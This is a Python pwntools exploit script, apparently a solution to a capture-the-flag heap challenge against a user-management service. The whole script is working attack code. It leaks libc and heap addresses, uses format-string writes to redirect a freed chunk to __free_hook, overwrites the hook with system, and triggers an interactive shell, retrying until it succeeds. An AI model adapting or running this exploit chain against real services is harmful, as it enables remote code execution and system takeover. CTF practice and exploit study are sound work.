#!/usr/bin/python3
from pwn import *

# context.log_level = 'debug'

def add_user(usr,pwd):
    p.sendlineafter(b"> ",b"1")
    p.sendlineafter(b"Username: ",usr)
    p.sendlineafter(b"Password: ",pwd)

def del_user(id):
    p.sendlineafter(b"> ",b"2")
    p.sendlineafter(b"dihapus: ",str(id).encode())


def show_user():
    p.sendlineafter(b"> ",b"3")

def login(usr,pwd):
    p.sendlineafter(b"> ",b"4")
    p.sendlineafter(b"Username: ",usr)
    p.sendlineafter(b"Password: ",pwd)
    

def main():
    # Setup for unsortedbin to leak libc and heap
    global p
    # p = process(["../public/chall"])
    p = remote("127.0.0.1",32777)
    libc = ELF("../dist/libc.so.6")
    
    for i in range(8):
        add_user(b"A"*32,b"B"*31)

    for i in range(8):
        del_user(0x133f-i)

    show_user()

    p.recvuntil(b"uid: ")
    libc_1 = p.recvuntil(b"\n",drop=True)[2:].decode()

    p.recvuntil(b"username: ")
    libc_2 = hex(u16(p.recvuntil(b"\n",drop=True)))[2:]

    leak_libc = int(libc_2+libc_1,16)
    libc.address = leak_libc - 0x1ecbe0

    p.recvuntil(b"uid: ")
    heap_1 = p.recvuntil(b"\n",drop=True)[2:].decode()

    p.recvuntil(b"username: ")
    heap_2 = hex(u16(p.recvuntil(b"\n",drop=True)))[2:]

    leak_heap = int(heap_2+heap_1,16)
    heap_base = leak_heap - 0x3c0

    log.info("Leak libc: " + hex(leak_libc))
    log.info("Libc base: " + hex(libc.address))

    log.info("Leak heap: " + hex(leak_heap))
    log.info("Heap base: " + hex(heap_base))

    free_hook = libc.symbols['__free_hook'] - 0x8 # karena 4 byte awal otomatis keisi uid biar enak 8 byte aja paddingnya
    systems = libc.symbols['system']

    log.info("Libc free_hook: " + hex(free_hook))
    log.info("Libc system: " + hex(free_hook))

    ptr_fd = heap_base + 0x450

    x = (free_hook & 0xffff)
    y = ((free_hook & 0xffff0000) >> 16) - (free_hook & 0xffff)
    z = (free_hook >> 32) + 0x10000 - y - x

    # print(hex(x))
    # print(hex(y))
    # print(hex(z))

    payload1 = '%{}x'.format(str(x)).encode()
    payload1 += b'%13$hn'
    payload1 += '%{}x'.format(str(y)).encode()
    payload1 += b'%14$hn'
    payload1 += '%{}x'.format(str(z)).encode()
    payload1 += b'%15$hn'
    payload1 += b"A"
    payload1 += p64(ptr_fd)
    payload1 += p64(ptr_fd+2)
    payload1 += p64(ptr_fd+4)

    # a = "AAAA"+"%x,"*20 # for check input in format string
    # print(len(a))

    # gdb.attach(p,gdbscript="""
    # init-pwndbg
    # """)
            
    # to pop up shell
    add_user(b"AAh\x00",b"C") # to write /sh with adjustment for format string to write /bin

    add_user(payload1[:32],payload1[32:]) # fill 1 and also formatstring
    login(payload1[:32],payload1[32:]) # overwrite fd = free_hook

    ptr_bin = heap_base + 0x330

    bin = int.from_bytes(b"/bin/s",'little')
    bin1 = (bin & 0xffff)
    bin2 = ((bin & 0xffff0000) >> 16) - (bin & 0xffff)
    bin3 = (bin >> 32) + 0x10000 - bin2 - bin1

    payload2 = '%{}x'.format(str(bin1)).encode()
    payload2 += b'%13$hn'
    payload2 += '%{}x'.format(str(bin2)).encode()
    payload2 += b'%14$hn'
    payload2 += '%{}x'.format(str(bin3)).encode()
    payload2 += b'%15$hn'
    payload2 += b"A"*2
    payload2 += p64(ptr_bin)
    payload2 += p64(ptr_bin+2)
    payload2 += p64(ptr_bin+4)

    # print(hex(bin1))
    # print(hex(bin2))
    # print(hex(bin3))
    # print(len(payload2))

    add_user(payload2[:32],payload2[32:]) # set /bin in uid
    login(payload2[:32],payload2[32:])

    add_user(b"A"*4+p64(systems),b"C") # free_hook = system
    del_user(1852400175)

    p.interactive()

if __name__ == "__main__":
    # main()
    attempts = 0
    while True:
        try:
            attempts += 1
            print(f"Attempt {attempts}")
            main()
        except Exception as e:
            print(e)
            p.close()
            continue
        else:
            break